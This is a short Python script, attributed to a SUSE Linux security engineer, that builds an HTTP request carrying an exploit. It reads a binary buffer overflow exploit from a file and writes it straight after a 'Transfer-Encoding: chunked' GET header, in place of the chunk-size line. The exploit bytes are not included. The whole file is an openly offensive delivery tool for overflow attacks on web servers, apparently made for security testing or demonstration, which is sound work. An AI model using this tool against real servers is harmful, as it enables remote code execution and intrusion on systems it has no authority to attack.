#!/usr/bin/python3
from __future__ import print_function

import argparse
import os
import sys

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com

parser = argparse.ArgumentParser(
    description="Embed a buffer overflow exploit into a HTTP chunked transfer encoding header"
)

parser.add_argument("-e", "--exploit", type=str,
    help="Path to a file containing the binary buffer overflow exploit",
    required=True)

args = parser.parse_args()

header = "GET / HTTP/1.0\r\nTransfer-Encoding: chunked\r\n\r\n"

exploit = open(args.exploit, 'rb').read()
size_line = exploit
stdout_fl = sys.stdout.fileno()
# print(header, size_line, sep='', end='')
os.write(stdout_fl, header.encode())
os.write(stdout_fl, exploit)
sys.stdout.flush()
